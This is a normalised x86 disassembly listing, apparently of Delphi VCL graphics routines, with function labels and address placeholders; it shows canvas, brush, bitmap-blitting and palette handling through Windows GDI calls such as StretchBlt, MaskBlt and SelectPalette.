mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c3a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d54a
mov eax [ ebp - 0x8 ]
call sub_41c9b8
retn
sub_41d578
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41d594
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c9a8
xor eax eax
push ebp
push sub_41d5d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c328
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d5e0
mov eax [ ebp - 0x4 ]
call sub_41c9b8
retn
sub_41d5ec
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41d594
add esp 0x10
pop edi
pop esi
retn
sub_41d618
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d578
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41d594
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41d64c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41c17c
xor edx edx
push ebp
push sub_41d719
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c188
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c964
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41d734
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d578
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41d594
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41d768
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc50
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41dfa8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d17c
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41dfc8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d468
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41dfe8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_41437c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41d82c
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_414418
xor edx edx
mov eax esi
call sub_41dde0
mov eax [ esi + 0xc ]
call sub_403198
mov eax [ esi + 0x10 ]
call sub_403198
mov eax [ esi + 0x14 ]
call sub_403198
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_41d888
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41de34
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41d910
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
mov eax [ ebx + 0x14 ]
call sub_41d610
call sub_41c964
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c964
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_412be0
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d9bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
mov eax [ ebx + 0x14 ]
call sub_41d64c
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d9f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
mov eax [ ebx + 0x14 ]
call sub_41d64c
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41da34
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41da94
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41dac0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41daf8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41db40
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41db7c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4041a8
push eax
mov eax edi
call sub_4043a8
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41dbc0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41db7c
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41dbdc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41db7c
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41dbfc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41dc48
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc4f
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41da6c
sub_41dca8
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41dccc
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41da94
pop ecx
pop edx
pop edi
pop esi
retn
sub_41dcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41dd18
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de34
mov eax [ ebp + 0x8 ]
call sub_41c964
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41dd80
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41dde0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41dd80
mov edx esp
mov eax ebx
call sub_41dca8
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41dccc
sub_41de34
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41ded0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
test bl 0x8
je r-xdata
mov eax esi
call sub_41defc
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41df2c
sub_41ded0
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41ce38
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c964
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41defc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41d338
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41df2c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41d64c
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41d64c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41d72c
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41d610
call sub_41c964
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41d610
call sub_41c964
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41e05c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41e0a6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e0ad
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_41e0b0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41e14c
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41e05c
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404158
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e153
lea eax [ ebp - 0x104 ]
call sub_403ee8
retn
sub_41e168
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41e2b6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41e225
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41e0b0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41e0b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e2bd
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41e2c8
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41e2fc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41e158
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41e57c
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41e158
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e583
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41e158
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41e3cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_4069b8
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e583
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41e590
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41e5c8
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402b98
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41e640
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41e698
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028d8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e795
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e79c
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
